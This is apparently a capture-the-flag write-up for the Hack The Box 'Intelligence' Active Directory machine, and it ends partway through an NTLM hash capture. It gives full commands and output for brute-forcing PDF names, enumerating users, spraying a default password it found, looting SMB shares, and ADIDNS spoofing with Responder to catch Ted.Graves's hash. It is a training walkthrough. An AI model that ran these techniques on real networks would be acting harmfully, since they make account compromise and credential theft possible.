|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://intelligence.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       56l      165w     1850c http://intelligence.htb/documents/scripts.js
200      GET        1l       44w     2532c http://intelligence.htb/documents/jquery.easing.min.js
200      GET      209l      800w    48542c http://intelligence.htb/documents/2020-12-15-upload.pdf
200      GET      208l      768w    47856c http://intelligence.htb/documents/2020-01-01-upload.pdf
200      GET      106l      659w    26989c http://intelligence.htb/documents/demo-image-01.jpg
200      GET        8l       29w    28898c http://intelligence.htb/documents/favicon.ico
200      GET        2l     1297w    89476c http://intelligence.htb/documents/jquery.min.js
200      GET        7l     1031w    84152c http://intelligence.htb/documents/bootstrap.bundle.min.js
200      GET      492l     2733w   186437c http://intelligence.htb/documents/demo-image-02.jpg
403      GET       29l       92w     1233c http://intelligence.htb/documents/
200      GET    10345l    19793w   190711c http://intelligence.htb/documents/styles.css
200      GET        5l   108280w  1194960c http://intelligence.htb/documents/all.js
200      GET      129l      430w     7432c http://intelligence.htb/
301      GET        2l       10w      157c http://intelligence.htb/documents => http://intelligence.htb/documents/
200      GET      129l      430w     7432c http://intelligence.htb/index.html
```

## 445 - SMB

```bash
┌──(bravosec㉿fsociety)-[~/htb/Intelligence]
└─$ nxc smb intelligence.htb -u '' -p ''
SMB         10.129.208.58   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.129.208.58   445    DC               [+] intelligence.htb\:

┌──(bravosec㉿fsociety)-[~/htb/Intelligence]
└─$ nxc smb intelligence.htb -u 'a' -p ''
SMB         10.129.208.58   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.129.208.58   445    DC               [-] intelligence.htb\a: STATUS_LOGON_FAILURE

┌──(bravosec㉿fsociety)-[~/htb/Intelligence]
└─$ nxc smb intelligence.htb -u '' -p '' --shares
SMB         10.129.208.58   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.129.208.58   445    DC               [+] intelligence.htb\:
SMB         10.129.208.58   445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED

┌──(bravosec㉿fsociety)-[~/htb/Intelligence]
└─$ nxc smb intelligence.htb -u '' -p '' --rid-brute --users
SMB         10.129.208.58   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.129.208.58   445    DC               [+] intelligence.htb\:
SMB         10.129.208.58   445    DC               [*] Trying to dump local users with SAMRPC protocol
SMB         10.129.208.58   445    DC               [-] Error connecting: LSAD SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
```


# User Flag
---

## Enumeration


### 80

![](/assets/obsidian/fd3c5f5f5a13314b7aebfacd79bf95ae.png)

![](/assets/obsidian/127899826dcbbd8ebe9a564caa29c8fd.png)

![](/assets/obsidian/098466465d920dd63b14d3a3555265fa.png)

The directory `/documents` doesn't allow dir listing

![](/assets/obsidian/7babecc705ecbb889237895873637a77.png)

The file uploads for DPFs share a regular pattern of date

![](/assets/obsidian/a2424091a423660850f114fb320a0962.png)

Tried `2020-12-20`, and the PDF exists, which means we can brute force PDFs

![](/assets/obsidian/4a35cf5752dee28551121c2b66e7fc49.png)

The author name was in PDF's metadata

```bash
┌──(bravosec㉿fsociety)-[~/htb/Intelligence/dump]
└─$ wget http://intelligence.htb/documents/2020-01-01-upload.pdf

┌──(bravosec㉿fsociety)-[~/htb/Intelligence/dump]
└─$ exiftool 2020-01-01-upload.pdf
ExifTool Version Number         : 12.67
File Name                       : 2020-01-01-upload.pdf
Directory                       : .
File Size                       : 27 kB
File Modification Date/Time     : 2021:04:02 01:00:00+08:00
File Access Date/Time           : 2023:12:26 15:18:51+08:00
File Inode Change Date/Time     : 2023:12:26 15:18:51+08:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : William.Lee
```

## Auth as Tiffany.Molina


### Kerbrute users from PDFs

Generated a list of valid dates for `2020~2021`

```bash
for i in $(seq 0 366); do echo $(date -I -d "2020-01-01 +$i days"); done > dates.txt
```

Dump the PDFs with **ffuf** and my tool [dfuf](https://github.com/opabravo/dfuf)

```bash
ffuf -c -w dates.txt -u 'http://intelligence.htb/documents/FUZZ-upload.pdf' -o ffuf.json -od ffuf
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Intelligence/dump]
└─$ dfuf -o ffuf.json -od ffuf ffuf_dump
[+] Done! Extracted files saved to /home/kali/htb/Intelligence/dump/ffuf_dump
```

These are 84 PDFs

```bash
┌──(bravosec㉿fsociety)-[~/htb/Intelligence/dump/ffuf_dump]
└─$ file * | awk -F ":" '{print $2}' | sort | uniq -c | sort -n
     84  PDF document, version 1.5
```

Extract creators from PDFs

```bash
┌──(bravosec㉿fsociety)-[~/htb/Intelligence/dump/ffuf_dump]
└─$ exiftool -p '$Creator' * | grep -v 'image files' | uniq | tee creators.txt
   84 image files read
William.Lee
Scott.Scott
Jason.Wright
Veronica.Patel
Jennifer.Thomas
Danny.Matthews
David.Reed
Stephanie.Young
Daniel.Shelton
[...]
```

Check usernames and **asreproasting** at the same time with **kerbrute**

All 84 usernames are valid, no **asreproastable** users found

```bash
┌──(bravosec㉿fsociety)-[~/htb/Intelligence/dump/ffuf_dump]
└─$ kerbrute userenum -d intelligence.htb --dc DC.intelligence.htb creators.txt -o kerbrute.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 12/25/23 - Ronnie Flathers @ropnop

2023/12/25 23:51:22 >  Using KDC(s):
2023/12/25 23:51:22 >   DC.intelligence.htb:88

2023/12/25 23:51:23 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2023/12/25 23:51:23 >  [+] VALID USERNAME:       Danny.Matthews@intelligence.htb
2023/12/25 23:51:23 >  [+] VALID USERNAME:       Jennifer.Thomas@intelligence.htb
2023/12/25 23:51:23 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2023/12/25 23:51:23 >  [+] VALID USERNAME:       Jason.Wright@intelligence.htb
2023/12/25 23:51:23 >  [+] VALID USERNAME:       Veronica.Patel@intelligence.htb
2023/12/25 23:51:23 >  [+] VALID USERNAME:       Scott.Scott@intelligence.htb
2023/12/25 23:51:23 >  [+] VALID USERNAME:       Stephanie.Young@intelligence.htb
2023/12/25 23:51:23 >  [+] VALID USERNAME:       Daniel.Shelton@intelligence.htb
2023/12/25 23:51:23 >  [+] VALID USERNAME:       David.Reed@intelligence.htb
2023/12/25 23:51:23 >  [+] VALID USERNAME:       John.Coleman@intelligence.htb
2023/12/25 23:51:23 >  [+] VALID USERNAME:       Jason.Wright@intelligence.htb
2023/12/25 23:51:23 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2023/12/25 23:51:23 >  [+] VALID USERNAME:       Daniel.Shelton@intelligence.htb
2023/12/25 23:51:23 >  [+] VALID USERNAME:       Brian.Morris@intelligence.htb
2023/12/25 23:51:23 >  [+] VALID USERNAME:       Thomas.Valenzuela@intelligence.htb
2023/12/25 23:51:23 >  [+] VALID USERNAME:       Samuel.Richardson@intelligence.htb
2023/12/25 23:51:23 >  [+] VALID USERNAME:       Richard.Williams@intelligence.htb
2023/12/25 23:51:23 >  [+] VALID USERNAME:       Jennifer.Thomas@intelligence.htb
2023/12/25 23:51:23 >  [+] VALID USERNAME:       Travis.Evans@intelligence.htb
2023/12/25 23:51:23 >  [+] VALID USERNAME:       David.Mcbride@intelligence.htb
2023/12/25 23:51:23 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2023/12/25 23:51:23 >  [+] VALID USERNAME:       John.Coleman@intelligence.htb
2023/12/25 23:51:23 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2023/12/25 23:51:23 >  [+] VALID USERNAME:       Anita.Roberts@intelligence.htb
2023/12/25 23:51:23 >  [+] VALID USERNAME:       Brian.Baker@intelligence.htb
2023/12/25 23:51:23 >  [+] VALID USERNAME:       David.Mcbride@intelligence.htb
2023/12/25 23:51:23 >  [+] VALID USERNAME:       Kelly.Long@intelligence.htb
2023/12/25 23:51:23 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2023/12/25 23:51:24 >  [+] VALID USERNAME:       John.Coleman@intelligence.htb
2023/12/25 23:51:24 >  [+] VALID USERNAME:       David.Reed@intelligence.htb
2023/12/25 23:51:24 >  [+] VALID USERNAME:       Thomas.Valenzuela@intelligence.htb
2023/12/25 23:51:24 >  [+] VALID USERNAME:       Nicole.Brock@intelligence.htb
2023/12/25 23:51:24 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2023/12/25 23:51:24 >  [+] VALID USERNAME:       Kaitlyn.Zimmerman@intelligence.htb
2023/12/25 23:51:24 >  [+] VALID USERNAME:       Darryl.Harris@intelligence.htb
2023/12/25 23:51:24 >  [+] VALID USERNAME:       David.Mcbride@intelligence.htb
2023/12/25 23:51:24 >  [+] VALID USERNAME:       Jason.Patterson@intelligence.htb
2023/12/25 23:51:24 >  [+] VALID USERNAME:       Thomas.Valenzuela@intelligence.htb
2023/12/25 23:51:24 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2023/12/25 23:51:24 >  [+] VALID USERNAME:       David.Mcbride@intelligence.htb
2023/12/25 23:51:24 >  [+] VALID USERNAME:       David.Reed@intelligence.htb
2023/12/25 23:51:24 >  [+] VALID USERNAME:       Nicole.Brock@intelligence.htb
2023/12/25 23:51:24 >  [+] VALID USERNAME:       Stephanie.Young@intelligence.htb
2023/12/25 23:51:24 >  [+] VALID USERNAME:       John.Coleman@intelligence.htb
2023/12/25 23:51:24 >  [+] VALID USERNAME:       Stephanie.Young@intelligence.htb
2023/12/25 23:51:24 >  [+] VALID USERNAME:       David.Wilson@intelligence.htb
2023/12/25 23:51:24 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2023/12/25 23:51:24 >  [+] VALID USERNAME:       Veronica.Patel@intelligence.htb
2023/12/25 23:51:24 >  [+] VALID USERNAME:       John.Coleman@intelligence.htb
2023/12/25 23:51:24 >  [+] VALID USERNAME:       Scott.Scott@intelligence.htb
2023/12/25 23:51:24 >  [+] VALID USERNAME:       Teresa.Williamson@intelligence.htb
2023/12/25 23:51:24 >  [+] VALID USERNAME:       John.Coleman@intelligence.htb
2023/12/25 23:51:24 >  [+] VALID USERNAME:       Samuel.Richardson@intelligence.htb
2023/12/25 23:51:24 >  [+] VALID USERNAME:       Jason.Wright@intelligence.htb
2023/12/25 23:51:24 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2023/12/25 23:51:24 >  [+] VALID USERNAME:       Nicole.Brock@intelligence.htb
2023/12/25 23:51:25 >  [+] VALID USERNAME:       Ian.Duncan@intelligence.htb
2023/12/25 23:51:25 >  [+] VALID USERNAME:       Travis.Evans@intelligence.htb
2023/12/25 23:51:25 >  [+] VALID USERNAME:       Jessica.Moody@intelligence.htb
2023/12/25 23:51:25 >  [+] VALID USERNAME:       Ian.Duncan@intelligence.htb
2023/12/25 23:51:25 >  [+] VALID USERNAME:       David.Mcbride@intelligence.htb
2023/12/25 23:51:25 >  [+] VALID USERNAME:       Jason.Wright@intelligence.htb
2023/12/25 23:51:25 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2023/12/25 23:51:25 >  [+] VALID USERNAME:       Richard.Williams@intelligence.htb
2023/12/25 23:51:25 >  [+] VALID USERNAME:       Jessica.Moody@intelligence.htb
2023/12/25 23:51:25 >  [+] VALID USERNAME:       Tiffany.Molina@intelligence.htb
2023/12/25 23:51:25 >  [+] VALID USERNAME:       Kaitlyn.Zimmerman@intelligence.htb
2023/12/25 23:51:25 >  [+] VALID USERNAME:       Teresa.Williamson@intelligence.htb
2023/12/25 23:51:25 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2023/12/25 23:51:25 >  [+] VALID USERNAME:       Brian.Baker@intelligence.htb
2023/12/25 23:51:25 >  [+] VALID USERNAME:       Anita.Roberts@intelligence.htb
2023/12/25 23:51:25 >  [+] VALID USERNAME:       Tiffany.Molina@intelligence.htb
2023/12/25 23:51:25 >  [+] VALID USERNAME:       Samuel.Richardson@intelligence.htb
2023/12/25 23:51:25 >  [+] VALID USERNAME:       Ian.Duncan@intelligence.htb
2023/12/25 23:51:25 >  [+] VALID USERNAME:       Stephanie.Young@intelligence.htb
2023/12/25 23:51:25 >  [+] VALID USERNAME:       Kelly.Long@intelligence.htb
2023/12/25 23:51:25 >  [+] VALID USERNAME:       Ian.Duncan@intelligence.htb
2023/12/25 23:51:25 >  [+] VALID USERNAME:       Travis.Evans@intelligence.htb
2023/12/25 23:51:25 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2023/12/25 23:51:25 >  [+] VALID USERNAME:       David.Wilson@intelligence.htb
2023/12/25 23:51:25 >  [+] VALID USERNAME:       Ian.Duncan@intelligence.htb
2023/12/25 23:51:25 >  [+] VALID USERNAME:       Jason.Patterson@intelligence.htb
2023/12/25 23:51:25 >  [+] VALID USERNAME:       Thomas.Hall@intelligence.htb
2023/12/25 23:51:25 >  Done! Tested 84 usernames (84 valid) in 3.036 seconds
```


### Default password in PDF

Convert PDFs to text

```bash
for f in $(ls); do pdftotext $f; done
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Intelligence/dump/ffuf_dump]
└─$ grep -rin pass
2020-06-04.txt:3:Please login using your username and the default password of:
2020-06-04.txt:5:After logging in please change your password as soon as possible.
```

Got a default password for new domain users

```bash
┌──(bravosec㉿fsociety)-[~/htb/Intelligence/dump/ffuf_dump]
└─$ grep -rin pass -E5
2020-06-04.txt-1-New Account Guide
2020-06-04.txt-2-Welcome to Intelligence Corp!
2020-06-04.txt:3:Please login using your username and the default password of:
2020-06-04.txt-4-NewIntelligenceCorpUser9876
2020-06-04.txt:5:After logging in please change your password as soon as possible.
2020-06-04.txt-6-
2020-06-04.txt-7-
```


### Password spary

Extract usernames from kerbrute output

```bash
┌──(bravosec㉿fsociety)-[~/htb/Intelligence]
└─$ cat dump/ffuf_dump/kerbrute.txt | grep -F '[+] VALID USERNAME' | awk '{print $7}' | awk -F'@' '{print $1}' > ad_users.lst
```

> **Issue of **kerbrute** passwordspray**
> **kerbrute** is faster than **smartbrute**, but :
> 
> Without syncing the time with DC, **kerbrute** won't show the success result without supplying `-v` (Verbose)
> ```bash
> kerbrute passwordspray -d intelligence.htb --dc DC.intelligence.htb ad_users.lst 'NewIntelligenceCorpUser9876'
> ```
> 
> ```bash
> 2023/12/26 00:11:51 >  [!] Tiffany.Molina@intelligence.htb:NewIntelligenceCorpUser9876 - [Root cause: KDC_Error] KDC_Error: AS Exchange Error: kerberos error response from KDC: KRB Error: (37) KRB_AP_ERR_SKEW Clock skew too great
> ```
{: .prompt-tip }

Spray default password

```bash
/opt/sectools/ad/smartbrute/smartbrute.py brute -bU ad_users.lst -bp 'NewIntelligenceCorpUser9876' kerberos -d intelligence.htb
```

![](/assets/obsidian/84a25b97b84a27378b8eea9de1070f69.png)

Validate the creds

```bash
┌──(bravosec㉿fsociety)-[~/htb/Intelligence]
└─$ nxc smb intelligence.htb -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876'
SMB         10.129.208.58   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.129.208.58   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
```

## Auth as Mr.Teddy


### AD enumeration


#### Tools

```bash
ldapdomaindump -o ldapdomaindump -r intelligence.htb -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876'

mkdir -p bloodhound-result && cd bloodhound-result && bloodhound-python -d intelligence.htb -ns 10.129.208.58 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -c all

AD-miner -c -cf intelligence.htb -u neo4j -p i_hate_eset
```

#### Findings

These 4 users have none default group

![](/assets/obsidian/6a07d0c329c4543bfcbb84cd71dde418.png)

Only `TED.GRAVES`, `TIFFANY.MOLINA`, `SVC_INT$`, `Administrator` have logged in to the DC

![](/assets/obsidian/d3dfdfdae78e9c9f5717fa1db1e6cd1a.png)

Users in `ITSUPPORT` group (`Ted Graves`, `Laura Lee`) can read **GMSA** password

![](/assets/obsidian/56d63fc30e4ae8e61d1fb6d1e1aaab77.png)

Password complexity was not required

```bash
┌──(bravosec㉿fsociety)-[~/htb/Intelligence]
└─$ nxc smb intelligence.htb -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --pass-pol
SMB         10.129.208.58   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.129.208.58   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
SMB         10.129.208.58   445    DC               [+] Dumping password info for domain: intelligence
SMB         10.129.208.58   445    DC               Minimum password length: 7
SMB         10.129.208.58   445    DC               Password history length: None
SMB         10.129.208.58   445    DC               Maximum password age: Not Set
SMB         10.129.208.58   445    DC
SMB         10.129.208.58   445    DC               Password Complexity Flags: 000000
SMB         10.129.208.58   445    DC                   Domain Refuse Password Change: 0
SMB         10.129.208.58   445    DC                   Domain Password Store Cleartext: 0
SMB         10.129.208.58   445    DC                   Domain Password Lockout Admins: 0
SMB         10.129.208.58   445    DC                   Domain Password No Clear Change: 0
SMB         10.129.208.58   445    DC                   Domain Password No Anon Change: 0
SMB         10.129.208.58   445    DC                   Domain Password Complex: 0
SMB         10.129.208.58   445    DC
SMB         10.129.208.58   445    DC               Minimum password age: None
SMB         10.129.208.58   445    DC               Reset Account Lockout Counter: None
SMB         10.129.208.58   445    DC               Locked Account Duration: None
SMB         10.129.208.58   445    DC               Account Lockout Threshold: None
SMB         10.129.208.58   445    DC               Forced Log off Time: Not Set
```

Shortest Paths -> Shortest Paths to High Value Targets

![](/assets/obsidian/d3c7e559978326e7e8878b56e3c75168.png)

> **Bloodhound Shortest Path Tip**
> Drag : 
> - default / administrative objects to the left
> - none default / unfactorized objects to the right
> - Targets to the top
> 
> Click on object in the top, ignore paths from the left, focus on paths from the right
{: .prompt-tip }

`SVC_INT$` is **allowed to delegate DC**

![](/assets/obsidian/59a413bd15d97ac269d1d073545541f0.png)

#### Find shortest path to SVC_INT$

![](/assets/obsidian/54d6d46e6386b33411aae8cd6f30d625.png)

Find a way to get into `Ted.Graves` or `Laura.Lee`

![](/assets/obsidian/03a031622cc6547c742bc2083584fe16.png)

### SMB shares

```bash
┌──(bravosec㉿fsociety)-[~/htb/Intelligence]
└─$ nxc smb intelligence.htb -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --shares
SMB         10.129.208.58   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.129.208.58   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
SMB         10.129.208.58   445    DC               [*] Enumerated shares
SMB         10.129.208.58   445    DC               Share           Permissions     Remark
SMB         10.129.208.58   445    DC               -----           -----------     ------
SMB         10.129.208.58   445    DC               ADMIN$                          Remote Admin
SMB         10.129.208.58   445    DC               C$                              Default share
SMB         10.129.208.58   445    DC               IPC$            READ            Remote IPC
SMB         10.129.208.58   445    DC               IT              READ
SMB         10.129.208.58   445    DC               NETLOGON        READ            Logon server share
SMB         10.129.208.58   445    DC               SYSVOL          READ            Logon server share
SMB         10.129.208.58   445    DC               Users           READ
```

**Netexec**'s `spider_plus` module had issue downloading the files, so I will use **smbclient** instead

```bash
mkdir -p loot/smb && cd loot/smb
folders=(IT Users); for f in $folders; do mkdir -p $f && cd $f && smbclient "//intelligence.htb/$f" -U 'Tiffany.Molina%NewIntelligenceCorpUser9876' -c 'mask ""; recurse ON; prompt OFF; mget *'; cd ..; done
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Intelligence/loot/smb]
└─$ find . -type f -ls | grep -vE '.lnk$|desktop.ini$'
  3550278    512 -rw-r--r--   1 bravosec kali       524288 Dec 26 08:30 ./Users/Default/NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000002.regtrans-ms
  3550255     48 -rw-r--r--   1 bravosec kali        49152 Dec 26 08:30 ./Users/Default/NTUSER.DAT.LOG2
  3550253     64 -rw-r--r--   1 bravosec kali        65536 Dec 26 08:30 ./Users/Default/NTUSER.DAT
  3550276     64 -rw-r--r--   1 bravosec kali        65536 Dec 26 08:30 ./Users/Default/NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TM.blf
  3550275    512 -rw-r--r--   1 bravosec kali       524288 Dec 26 08:30 ./Users/Default/NTUSER.DAT{0d4799bb-b8b5-11e8-ac1a-e41d2d717380}.TMContainer00000000000000000002.regtrans-ms
  3550274    512 -rw-r--r--   1 bravosec kali       524288 Dec 26 08:30 ./Users/Default/NTUSER.DAT{0d4799bb-b8b5-11e8-ac1a-e41d2d717380}.TMContainer00000000000000000001.regtrans-ms
  3550273     64 -rw-r--r--   1 bravosec kali        65536 Dec 26 08:30 ./Users/Default/NTUSER.DAT{0d4799bb-b8b5-11e8-ac1a-e41d2d717380}.TM.blf
  3550254     64 -rw-r--r--   1 bravosec kali        65536 Dec 26 08:30 ./Users/Default/NTUSER.DAT.LOG1
  3550277    512 -rw-r--r--   1 bravosec kali       524288 Dec 26 08:30 ./Users/Default/NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000001.regtrans-ms
  3550286      4 -rw-r--r--   1 bravosec kali           34 Dec 26 08:30 ./Users/Tiffany.Molina/Desktop/user.txt
  3550287      8 -rw-r--r--   1 bravosec kali         8192 Dec 26 08:31 ./Users/Tiffany.Molina/AppData/Local/Microsoft/Windows/UsrClass.dat
  3550289      8 -rw-r--r--   1 bravosec kali         8192 Dec 26 08:31 ./Users/Tiffany.Molina/AppData/Local/Microsoft/Windows/UsrClass.dat.LOG2
  3550291    512 -rw-r--r--   1 bravosec kali       524288 Dec 26 08:31 ./Users/Tiffany.Molina/AppData/Local/Microsoft/Windows/UsrClass.dat{21166fb4-a0a8-11eb-ae74-000c2908ad93}.TMContainer00000000000000000001.regtrans-ms
  3550290     64 -rw-r--r--   1 bravosec kali        65536 Dec 26 08:31 ./Users/Tiffany.Molina/AppData/Local/Microsoft/Windows/UsrClass.dat{21166fb4-a0a8-11eb-ae74-000c2908ad93}.TM.blf
  3550292    512 -rw-r--r--   1 bravosec kali       524288 Dec 26 08:31 ./Users/Tiffany.Molina/AppData/Local/Microsoft/Windows/UsrClass.dat{21166fb4-a0a8-11eb-ae74-000c2908ad93}.TMContainer00000000000000000002.regtrans-ms
  3550288      8 -rw-r--r--   1 bravosec kali         8192 Dec 26 08:31 ./Users/Tiffany.Molina/AppData/Local/Microsoft/Windows/UsrClass.dat.LOG1
  3550284    512 -rw-r--r--   1 bravosec kali       524288 Dec 26 08:30 ./Users/Tiffany.Molina/NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000002.regtrans-ms
  3550285      4 -rw-r--r--   1 bravosec kali           20 Dec 26 08:30 ./Users/Tiffany.Molina/ntuser.ini
  3550279    128 -rw-r--r--   1 bravosec kali       131072 Dec 26 08:30 ./Users/Tiffany.Molina/NTUSER.DAT
  3550282     64 -rw-r--r--   1 bravosec kali        65536 Dec 26 08:30 ./Users/Tiffany.Molina/NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TM.blf
  3550280     84 -rw-r--r--   1 bravosec kali        86016 Dec 26 08:30 ./Users/Tiffany.Molina/ntuser.dat.LOG1
  3550281      0 -rw-r--r--   1 bravosec kali            0 Dec 26 08:30 ./Users/Tiffany.Molina/ntuser.dat.LOG2
  3550283    512 -rw-r--r--   1 bravosec kali       524288 Dec 26 08:30 ./Users/Tiffany.Molina/NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000001.regtrans-ms
  3548315      4 -rw-r--r--   1 bravosec kali         1046 Dec 26 08:29 ./IT/downdetector.ps1
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Intelligence/loot/smb]
└─$ cat ./Users/Tiffany.Molina/Desktop/user.txt
4e64a645bcc6127cbcf3739ea2f2d4ff
```


### Capture hashes via ADIDNS poisoning

The powershell script `./IT/downdetector.ps1` is a site down / up monitor

```bash
┌──(bravosec㉿fsociety)-[~/htb/Intelligence/loot/smb]
└─$ cat ./IT/downdetector.ps1

# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```

It makes request with `-UseDefaultCredentials` to every object in `DomainDnsZones` that starts with `web`

We can steal NTLM hash by creating a DNS record that pointsto our rogue web server

> More detailed info - https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing

I can query existing records

> Must supply **IP** instead of domain name for target, otherwise it will fail to resolve hosts
{: .prompt-warning }

```bash
┌──(bravosec㉿fsociety)-[~/htb/Intelligence]
└─$ /opt/sectools/ad/krbrelayx/dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --record '@' --action 'query' 10.129.208.58
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found record @
DC=@,DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb
[+] Record entry:
 - Type: 28 (Unsupported) (Serial: 145)
DC=@,DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb
[+] Record entry:
 - Type: 28 (Unsupported) (Serial: 145)
DC=@,DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb
[+] Record entry:
 - Type: 6 (SOA) (Serial: 145)
 - Serial: 144
 - Refresh: 900
 - Retry: 600
 - Expire: 86400
 - Minimum TTL: 3600
 - Primary server: dc.intelligence.htb.
 - Zone admin email: hostmaster.intelligence.htb.
DC=@,DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb
[+] Record entry:
 - Type: 2 (NS) (Serial: 145)
 - Address: dc.intelligence.htb.
DC=@,DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb
[+] Record entry:
 - Type: 1 (A) (Serial: 145)
 - Address: 10.129.208.58
```

Start responder

```bash
sudo responder -A -I tun0 -v
```

Add rogue DNS record

```bash
┌──(bravosec㉿fsociety)-[~/htb/Intelligence]
└─$ /opt/sectools/ad/krbrelayx/dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --record 'web123.intelligence.htb' -a add -d 10.10.16.30 10.129.208.58
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

I can confirm the record was added

```bash
┌──(bravosec㉿fsociety)-[~/htb/Intelligence]
└─$ nslookup
> server 10.10.16.30
Default server: 10.10.16.30
Address: 10.10.16.30#53
> web123
Server:         10.10.16.30
Address:        10.10.16.30#53

Name:   web123
Address: 10.10.16.30
Name:   web123
Address: dead:beef:4::101c
```

After about 2 minutes, I received the hash

```bash
[*] [DNS] A Record poisoned answer sent to: 10.10.16.30      Requested name: .web123
[*] [DNS] AAAA Record poisoned answer sent to: 10.10.16.30      Requested name: .web123
[HTTP] Sending NTLM authentication request to 10.129.208.58
[HTTP] GET request from: ::ffff:10.129.208.58  URL: /
[HTTP] NTLMv2 Client   : 10.129.208.58
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
